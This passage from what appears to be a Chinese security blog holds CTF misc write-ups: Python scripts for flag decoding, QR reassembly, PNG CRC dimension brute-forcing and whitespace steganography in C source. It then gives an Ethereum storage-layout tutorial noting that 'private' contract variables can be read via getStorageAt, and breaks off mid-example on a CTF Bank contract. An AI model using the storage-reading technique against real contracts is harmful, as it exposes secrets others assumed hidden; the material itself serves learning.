class="hljs-string">&#x27;10210897103375566531005253102975053545155505050521025256555254995410298561015151985150375568&#x27;</span><br>tem = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(s):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(s[:<span class="hljs-number">3</span>])&lt;<span class="hljs-number">127</span>:<br>        tem += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(s[:<span class="hljs-number">3</span>]))<br>        s = s[<span class="hljs-number">3</span>:]<br>    <span class="hljs-keyword">else</span>:<br>        tem +=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(s[:<span class="hljs-number">2</span>]))<br>        s= s[<span class="hljs-number">2</span>:]<br><span class="hljs-comment"># print(tem)  flag%7B5d45fa256372224f48746c6fb8e33b32%7D</span><br>url = urllib.parse.unquote(tem)<br><span class="hljs-built_in">print</span>(url) <span class="hljs-comment"># flag&#123;5d45fa256372224f48746c6fb8e33b32&#125;</span><br></code></pre></td></tr></table></figure><h3 id="DDCTF2018-第四扩展FS"><a href="#DDCTF2018-第四扩展FS" class="headerlink" title="[DDCTF2018]第四扩展FS"></a>[DDCTF2018]第四扩展FS</h3><p>binwalk分析图片得到压缩包，再exif找到提示，打开压缩包，得到</p><p><img src="/../images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-16%20165539.png" alt="屏幕截图 2024-04-16 165539"></p><p>看提示是词频分析</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> Counter<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;file.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<span class="hljs-keyword">as</span> f:<br>    s=f.read()<br><br>result = Counter(s)<br><span class="hljs-comment">#print(result)</span><br>flag=[key <span class="hljs-keyword">for</span> key , value <span class="hljs-keyword">in</span> <span class="hljs-built_in">sorted</span>(result.items(),key=<span class="hljs-keyword">lambda</span> k:k[<span class="hljs-number">1</span>],reverse =<span class="hljs-literal">True</span> )]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(flag)) <span class="hljs-comment"># DCTF&#123;huanwe1sik4o!&#125;</span><br></code></pre></td></tr></table></figure><h3 id="CTF2019-babyflash"><a href="#CTF2019-babyflash" class="headerlink" title="[*CTF2019]babyflash"></a>[*CTF2019]babyflash</h3><p>一个flash文件利用 jpexi进行分离得到 一个wav文件和一堆二维码部分</p><p>二维码进行组装</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aaa</span>(<span class="hljs-params">s</span>):<br>    image = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;frames/&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;.png&quot;</span>)<br>    a,b,c,d = image.getpixel((<span class="hljs-number">50</span>,<span class="hljs-number">50</span>))<br>    <span class="hljs-keyword">return</span> a<br>data=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">442</span>):<br>    <span class="hljs-keyword">if</span> aaa(i)==<span class="hljs-number">0</span>:<br>        data+=<span class="hljs-string">&#x27;1&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        data+=<span class="hljs-string">&#x27;0&#x27;</span><br><br><br>length = <span class="hljs-number">21</span><br>img = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>, (length * <span class="hljs-number">5</span>, length * <span class="hljs-number">5</span>))<br><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length):<br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length):<br>        <span class="hljs-keyword">if</span> data[x*length+y] == <span class="hljs-string">&#x27;1&#x27;</span>:<br>            <span class="hljs-keyword">for</span> xx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(x*<span class="hljs-number">5</span>, x*<span class="hljs-number">5</span>+<span class="hljs-number">5</span>):<br>                <span class="hljs-keyword">for</span> yy <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(y*<span class="hljs-number">5</span>, y*<span class="hljs-number">5</span>+<span class="hljs-number">5</span>):<br>                    img.putpixel([xx, yy], (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">for</span> xx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(x*<span class="hljs-number">5</span>, x*<span class="hljs-number">5</span>+<span class="hljs-number">5</span>):<br>                <span class="hljs-keyword">for</span> yy <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(y*<span class="hljs-number">5</span>, y*<span class="hljs-number">5</span>+<span class="hljs-number">5</span>):<br>                    img.putpixel([xx, yy], (<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>))<br><br><span class="hljs-comment"># 保存新图像</span><br>img.save(<span class="hljs-string">&#x27;flag.png&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>wav解开后得到flag</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">*ctf&#123;half_flag_<span class="hljs-meta">&amp;&amp;_the_rest&#125;</span><br></code></pre></td></tr></table></figure><h3 id="羊城杯-2020-逃离东南亚"><a href="#羊城杯-2020-逃离东南亚" class="headerlink" title="[羊城杯 2020]逃离东南亚"></a>[羊城杯 2020]逃离东南亚</h3><p>打开是三个压缩包，第一个没有密码，给了一个png图片，发现宽高有问题</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs py"><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> struct<br><br>crcbp = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;img.png&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>).read()  <br><br>original_crc32 = <span class="hljs-built_in">int</span>(crcbp[<span class="hljs-number">29</span>:<span class="hljs-number">33</span>].<span class="hljs-built_in">hex</span>(), <span class="hljs-number">16</span>)<span class="hljs-comment">#打开图片</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2000</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2000</span>):<br>        data = crcbp[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>] + \<br>            struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, i)+struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, j)+crcbp[<span class="hljs-number">24</span>:<span class="hljs-number">29</span>]<br>        crc32 = binascii.crc32(data) &amp; <span class="hljs-number">0xffffffff</span><br>        <br>        <span class="hljs-keyword">if</span>(crc32 == original_crc32):    <span class="hljs-comment">#图片当前CRC</span><br>            <span class="hljs-built_in">print</span>(i, j)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;hex:&#x27;</span>, <span class="hljs-built_in">hex</span>(i), <span class="hljs-built_in">hex</span>(j))<br>            <span class="hljs-comment"># 249 300 hex: 0xf9 0x12c</span><br></code></pre></td></tr></table></figure><p>修改后得到下一个压缩包的密码</p><p><img src="/../images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20210946.png" alt="屏幕截图 2024-04-18 210946"></p><p>明显是brainfuck，但是解密得到乱码失败。猜测解压后应该得到字符串，但是字符串brainfuck加密后应该是++++++++[开头的，与密文不符，尝试在开头加上++++++++后解密成功</p><p><img src="/../images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20210953.png" alt="屏幕截图 2024-04-18 210953"></p><p>elf文件打开</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> base64<br>data = base64.b64decode(<span class="hljs-string">&#x27;&#x27;</span>)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test1&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<span class="hljs-keyword">as</span> f:<br>    f.write(data)<br>    <br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">./test1<br>hei~what you want??<br>want a flag?<br>sorry~there is <span class="hljs-literal">no</span> flag<br>but maybe your can <span class="hljs-built_in">find</span> something useful!<br></code></pre></td></tr></table></figure><p>然后分析wav ，sileneye</p><p><img src="/../images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20210930-17134502642734.png" alt="屏幕截图 2024-04-18 210930"></p><p>第三个文件夹打开</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 加入代码隐写的部分不能影响源代码的编译<br><span class="hljs-bullet">2.</span> 不能很容易被公司审计专员看出来<br><span class="hljs-bullet">3.</span> 不能直接明文交流<br><br><br></code></pre></td></tr></table></figure><p>md写了不能明文交流，联想到tab和空格，但是几千个文件，挨个查看不现实，因此考虑写个脚本搜索，由于tab和空格编写的隐藏数据通常是连续的，同时要过滤到常见的双空格和双&#x2F;t，因此考虑用 \t \t作为搜索字符 </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_file_list</span>(<span class="hljs-params">dir_path</span>):<br>    _<span class="hljs-built_in">list</span> = os.listdir(dir_path)<br>    file_list = []<br>    <span class="hljs-keyword">for</span> file_str <span class="hljs-keyword">in</span> _<span class="hljs-built_in">list</span> :<br>        new_dir_path = dir_path+ <span class="hljs-string">&#x27;\\&#x27;</span> +file_str<br>        <span class="hljs-keyword">if</span> os.path.isdir(new_dir_path):<br>            file_list.extend(get_file_list(new_dir_path))<br>        <span class="hljs-keyword">else</span> :<br>            file_list.append(new_dir_path)<br>    <span class="hljs-keyword">return</span> file_list<br><br>file_list = get_file_list(<span class="hljs-string">r&#x27;c:\Users\86157\Desktop\新建文件夹2\buu\attachment2\日记3\文件夹&#x27;</span>)<br><br><span class="hljs-keyword">for</span> file_str <span class="hljs-keyword">in</span>  file_list :<br>    f = <span class="hljs-built_in">open</span>(file_str,<span class="hljs-string">&#x27;r&#x27;</span>,encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        data = f.read()<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27; \t \t&#x27;</span> <span class="hljs-keyword">in</span> data :<br>            <span class="hljs-built_in">print</span>(file_str)<br>    <span class="hljs-keyword">except</span> :<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p>打开后发现每个} 后面 有隐写</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs py"><br><br>f_list = <span class="hljs-string">r&#x27;&#x27;&#x27;c:\Users\86157\Desktop\新建文件夹2\buu\attachment2\日记3\文件夹\elf\rtld.c</span><br><span class="hljs-string">c:\Users\86157\Desktop\新建文件夹2\buu\attachment2\日记3\文件夹\malloc\arena.c</span><br><span class="hljs-string">c:\Users\86157\Desktop\新建文件夹2\buu\attachment2\日记3\文件夹\malloc\malloc.c&#x27;&#x27;&#x27;</span><br>f_list = f_list.split(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>result = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> f_list:<br>    <span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(f, <span class="hljs-string">&#x27;r&#x27;</span>).readlines():<br>        data = data[:-<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&#125;&#x27;</span> <span class="hljs-keyword">in</span> data:<br>            data = data.split(<span class="hljs-string">&#x27;&#125;&#x27;</span>)[-<span class="hljs-number">1</span>]<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;\t&#x27;</span> <span class="hljs-keyword">in</span> data:<br>                data1 = data[::].replace(<span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>                data1 = data1.replace(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data1:<br>                    result += data<br><br>result = result.replace(<span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>result = result.replace(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>)<br><span class="hljs-built_in">print</span>(result)<br><br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljsbr></code></pre></td></tr></table></figure><p>转ascii</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">SOS! please help me -&gt; rtld.cyour flag is in malloc.cGWCTF&#123;code_steganography_1s_funny!&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Ethereum Storage</title>
      <link href="/2023/10/31/Ethereum-Storage/"/>
      <url>/2023/10/31/Ethereum-Storage/</url>
      
        <content type="html"><![CDATA[<h3 id="插槽"><a href="#插槽" class="headerlink" title="插槽"></a>插槽</h3><p>以太坊数据存储会为合约的每项数据指定一个可计算的存储位置，存放在一个容量为2^256超级数组中，数组每个元素为插槽，初始为0.</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section"># 插槽式数组存储</span><br><span class="hljs-section">----------------------------------</span><br><span class="hljs-section">|               0                |     # slot 0</span><br><span class="hljs-section">----------------------------------</span><br><span class="hljs-section">|               1                |     # slot 1</span><br><span class="hljs-section">----------------------------------</span><br><span class="hljs-section">|               2                |     # slot 2</span><br><span class="hljs-section">----------------------------------</span><br><span class="hljs-section">|              ...               |     # ...</span><br><span class="hljs-section">----------------------------------</span><br><span class="hljs-section">|              ...               |     # 每个插槽 32 字节</span><br><span class="hljs-section">----------------------------------</span><br><span class="hljs-section">|              ...               |     # ...</span><br><span class="hljs-section">----------------------------------</span><br><span class="hljs-section">|            2^256-1             |     # slot 2^256-1</span><br><span class="hljs-section">----------------------------------</span><br><br></code></pre></td></tr></table></figure><p>当数据长度是已知时，其具体的存储位置将在编译时指定，而对于长度不确定的类型（如动态数组、映射），则会按一定规则计算存储位置。以下是对不同类型变量的储存模型的具体分析。</p><h4 id="值类型"><a href="#值类型" class="headerlink" title="值类型"></a>值类型</h4><p>除映射和动态数组之外的所有类型，其数据长度都是已知的，如定长整型 (<code>int</code>&#x2F;<code>uint</code>&#x2F;…), 地址 (<code>address</code>), 定长浮点型 (<code>fixed</code>&#x2F;<code>ufixed</code>&#x2F;…), 定长字节数组 (<code>bytes1</code>-<code>bytes32</code>)，编译时将严格根据字段排序顺序，从位置 0 开始连续放置在存储中。如果可能的话，大小少于 32 字节的多个变量会被打包到一个插槽中，而当某项数据超过 32 字节，则需要占用多个连续插槽（<code>data.length / 32</code>）。规则如下：</p><ul><li>存储插槽的第一项会以低位对齐（即右对齐）的方式储存。</li><li>基本类型仅使用存储它们所需的字节。</li><li>如果存储插槽中的剩余空间不足以储存一个基本类型，那么它会被移入下一个存储插槽。</li><li>结构和数组数据总是会占用一整个新插槽（但结构或数组中的各项，都会以这些规则进行打包）。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.0;<br><br>contract C &#123;<br>    address a;      // 0（20）<br>    uint8 b;        // 0（1）<br>    uint256 c;      // 1（32）<br>    bytes24 d;      // 2（24）<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">-----------------------------------------------------</span><br><span class="hljs-code">| unused (11) | b (1) |            a (20)           | &lt;- slot 0</span><br><span class="hljs-code">-----------------------------------------------------</span><br><span class="hljs-section">|                       c (32)                      | &lt;- slot 1</span><br><span class="hljs-section">-----------------------------------------------------</span><br>| unused (8) |                d (24)                | &lt;- slot 2<br></code></pre></td></tr></table></figure><h4 id="映射"><a href="#映射" class="headerlink" title="映射"></a>映射</h4><p>对于形如 <code>mapping(address =&gt; uint) a;</code> 的映射类型变量，就无法简单仿照值类型按顺序储存了。对于映射，其会根据上节提到的规则占据位置 <code>p</code> 处的一个插槽，但该插槽不会被真正使用。映射中的键 <code>k</code> 所对应的值会位于 <code>keccak256(k . p)</code>， 其中 <code>.</code> 是连接符。如果该值同时是一个非基本类型，则将 <code>keccak256(k . p)</code> 作为偏移量来找到具体的位置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.0;<br><br>contract C &#123;<br>    mapping(address =&gt; uint) a;      // 0<br>    uint256 b;                       // 1<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs soliditrty">-----------------------------------------------------<br>|                    reserved (a)                   | &lt;- slot 0<br>-----------------------------------------------------<br>|                      b (32)                       | &lt;- slot 1<br>-----------------------------------------------------<br>|                        ...                        |   ......<br>-----------------------------------------------------<br>|                     a[addr] (32)                  | &lt;- slot `keccak256(addr . 0)`<br>-----------------------------------------------------<br>|                        ...                        |   ......<br>-----------------------------------------------------<br><br></code></pre></td></tr></table></figure><p>即 p为所存储的插槽的位置。</p><h4 id="动态数组"><a href="#动态数组" class="headerlink" title="动态数组"></a>动态数组</h4><p>对于形如 <code>uint[] b;</code> 的动态数组，其同样会占用对应位置 <code>p</code> 处的插槽，用以储存数组的长度，而数组真正的起始点会位于 <code>keccak256(p)</code> 处</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.0;<br><br>contract C &#123;<br>    uint256 a;      // 0<br>    uint[] b;       // 1<br>    uint256 c;      // 2<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">-----------------------------------------------------</span><br><span class="hljs-code">|                      a (32)                       | &lt;- slot 0</span><br><span class="hljs-code">-----------------------------------------------------</span><br><span class="hljs-section">|                    b.length (32)                  | &lt;- slot 1</span><br><span class="hljs-section">-----------------------------------------------------</span><br><span class="hljs-section">|                      c (32)                       | &lt;- slot 2</span><br><span class="hljs-section">-----------------------------------------------------</span><br><span class="hljs-section">|                        ...                        |   ......</span><br><span class="hljs-section">-----------------------------------------------------</span><br>|                      b[0] (32)                    | &lt;- slot <span class="hljs-code">`keccak256(1)`</span><br><span class="hljs-code">-----------------------------------------------------</span><br><span class="hljs-code">|                      b[1] (32)                    | &lt;- slot `keccak256(1) + 1`</span><br><span class="hljs-code">-----------------------------------------------------</span><br><span class="hljs-section">|                        ...                        |   ......</span><br><span class="hljs-section">-----------------------------------------------------</span><br><br></code></pre></td></tr></table></figure><h4 id="字节数组和字符串"><a href="#字节数组和字符串" class="headerlink" title="字节数组和字符串"></a>字节数组和字符串</h4><p>如果 <code>bytes</code> 和 <code>string</code> 的数据很短，那么它们的长度也会和数据一起存储到同一个插槽。具体地说：如果数据长度小于等于 31 字节， 则它存储在高位字节（左对齐），最低位字节存储 <code>length * 2</code>。如果数据长度超出 31 字节，则在主插槽存储 <code>length * 2 + 1</code>， 数据照常存储在 <code>keccak256(slot)</code> 中。</p><h4 id="可见性"><a href="#可见性" class="headerlink" title="可见性"></a>可见性</h4><p>由于以太坊上的所有信息都是公开的，所以即使一个变量被声明为 <code>private</code>，我们仍能读到变量的具体值。</p><p>利用 web3 提供的 <code>web3.eth.getStorageAt()</code> 方法，可以读取一个以太坊地址上指定位置的存储内容。所以只要计算出了一个变量对应的插槽位置，就可以通过调用该函数来获得该变量的具体值。</p><p>调用：</p><blockquote><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-comment">// web3.eth.getStorageAt(address, position [, defaultBlock] [, callback])</span><br>web3.eth.getStorageAt(<span class="hljs-string">&quot;0x407d73d8a49eeb85d32cf465507dd71d507100c1&quot;</span>, <span class="hljs-number">0</span>)<br>.then(<span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>);<br>&gt; <span class="hljs-string">&quot;0x033456732123ffff2342342dd12342434324234234fd234fd23fd4f23d4234&quot;</span><br><br></code></pre></td></tr></table></figure></blockquote><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">参数：<br>address：<span class="hljs-built_in">String</span> - 要读取的地址<br>position：<span class="hljs-built_in">Number</span> - 存储中的索引编号<br>defaultBlock：<span class="hljs-built_in">Number</span>|<span class="hljs-built_in">String</span> - 可选，使用该参数覆盖 web3.eth.defaultBlock 属性值<br>callback：<span class="hljs-built_in">Function</span> - 可选的回调函数, 其第一个参数为错误对象，第二个参数为结果。<br></code></pre></td></tr></table></figure><h3 id="数据储存位置分析"><a href="#数据储存位置分析" class="headerlink" title="数据储存位置分析"></a>数据储存位置分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.0;<br><br>contract C &#123;<br>    uint[] x; //  x的存储位置是storage<br><br>    // memoryArray的存储位置是 memory<br>    function f(uint[] memoryArray) public &#123;<br>        x = memoryArray;    // 从 memory 复制到 storage<br>        var y = x;          // storage 引用传递局部变量y（y 是一个 storage 引用）<br>        y[7];               // 返回第8个元素<br>        y.length = 2;       // x同样会被修改<br>        delete x;           // y同样会被修改<br><br>        // 错误， 不能将memory赋值给局部变量<br>        // y = memoryArray;  <br><br>        // 错误，不能通过引用销毁storage<br>        // delete y;        <br><br>        g(x);               // 引用传递， g可以改变x的内容<br>        h(x);               // 拷贝到memory， h无法改变x的内容<br>    &#125;<br><br>    function g(uint[] storage storageArray) internal &#123;&#125;<br>    function h(uint[] memoryArray) public &#123;&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>Balsn CTF 2019 的 Bank</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Bank &#123;<br>    address public owner;<br>    uint randomNumber = 0;<br><br>    struct SafeBox &#123;<br>        bool done;<br>        function(uint, bytes12) internal callback;<br>        bytes12 hash;<br>        uint value;<br>    &#125;<br>    SafeBox[] safeboxes;<br><br>    struct FailedAttempt &#123;<br>        uint idx;<br>        uint time;<br>        bytes12 triedPass;<br>        address origin;<br>    &#125;<br>    mapping(address =&gt; FailedAttempt[]) failedLogs;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 